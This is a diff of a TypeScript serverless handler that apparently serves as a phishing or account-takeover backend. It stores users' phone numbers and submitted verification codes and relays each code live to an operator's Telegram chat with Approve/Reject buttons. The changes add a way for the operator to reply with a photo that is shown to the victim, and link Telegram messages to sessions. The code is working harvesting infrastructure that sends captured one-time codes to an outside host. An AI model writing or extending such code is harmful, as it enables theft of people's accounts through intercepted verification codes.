@@ -20,10 +20,9 @@ async function kvGet(key: string) {
 }
 async function kvSet(key: string, val: string, ttlSec?: number) {
   const ex = ttlSec ? `?EX=${ttlSec}` : '';
-  const r = await fetch(
-    `${UPSTASH_URL}/SET/${encodeURIComponent(key)}/${encodeURIComponent(val)}${ex}`,
-    { headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` } }
-  );
+  const r = await fetch(`${UPSTASH_URL}/SET/${encodeURIComponent(key)}/${encodeURIComponent(val)}${ex}`, {
+    headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` },
+  });
   const j = await r.json();
   return j.result === 'OK';
 }
@@ -31,16 +30,15 @@ async function kvSet(key: string, val: string, ttlSec?: number) {
 const TG_API = (token: string) => `https://api.telegram.org/bot${token}`;
 
 async function sendMessage(text: string, replyMarkup?: any) {
-  const payload: any = {
-    chat_id: ADMIN_CHAT_ID,
-    text,
-  };
+  const payload: any = { chat_id: ADMIN_CHAT_ID, text };
   if (replyMarkup) payload.reply_markup = replyMarkup;
-  await fetch(`${TG_API(TG_TOKEN)}/sendMessage`, {
+  const r = await fetch(`${TG_API(TG_TOKEN)}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload),
   });
+  const j = await r.json();
+  return j;
 }
 
 export default async function handler(req: VercelRequest, res: VercelResponse) {
@@ -78,6 +76,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
 
     if (type === 'phone') {
       await kvSet(`phone:${sessionId}`, value, 3600);
+      // optional: notify admin
       await sendMessage(`Phone submitted: ${value}\nSession: ${sessionId}`);
       res.status(200).json({ ok: true });
       return;
@@ -88,14 +87,18 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       await kvSet(`status:${sessionId}`, 'pending', 3600);
 
       const phone = await kvGet(`phone:${sessionId}`);
-      const msg = `Verify code: ${value}\nFor phone: ${phone ?? 'UNKNOWN'}\nSession: ${sessionId}`;
+      const msg = `Verify code: ${value}\nFor phone: ${phone ?? 'UNKNOWN'}\nSession: ${sessionId}\n\n(Reply to this message with a photo to show it to the user)`;
       const inline = {
         inline_keyboard: [[
           { text: 'Approve ✅', callback_data: `approve|${sessionId}` },
           { text: 'Reject ❌',  callback_data: `reject|${sessionId}` },
         ]],
       };
-      await sendMessage(msg, inline);
+      const j = await sendMessage(msg, inline);
+      const mid = j?.result?.message_id;
+      if (mid) {
+        await kvSet(`msg_session:${mid}`, sessionId, 3600);
+      }
       res.status(200).json({ ok: true });
       return;
     }
